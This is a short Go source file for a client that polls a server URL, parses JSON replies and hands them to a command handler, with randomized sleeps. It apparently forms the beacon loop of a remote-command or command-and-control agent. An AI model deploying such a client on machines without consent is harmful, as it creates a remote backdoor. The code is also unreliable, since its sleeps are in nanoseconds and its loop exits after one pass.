package main

import (
	"client/utils"
	"encoding/json"
	"io"
	"log"
	"math/rand"
	"time"
)

func checkCommands() {
	// Check root url
	response := utils.GetURL(utils.RootURL)

	// No content
	if response.StatusCode == 204 {
		return
	}

	// Unhandled errors
	if response.StatusCode != 200 {
		return
	}

	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		log.Fatalf("Read body: %v", err)
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalf("Convert JSON: %v", err)
	}

	utils.HandleCommand(result)
}

func main() {

	max_sleep_seconds := 71

	for {
		time.Sleep(time.Duration(rand.Intn(max_sleep_seconds)))
		checkCommands()
		time.Sleep(time.Duration(rand.Intn(max_sleep_seconds)))
		checkCommands()
		return
	}

}
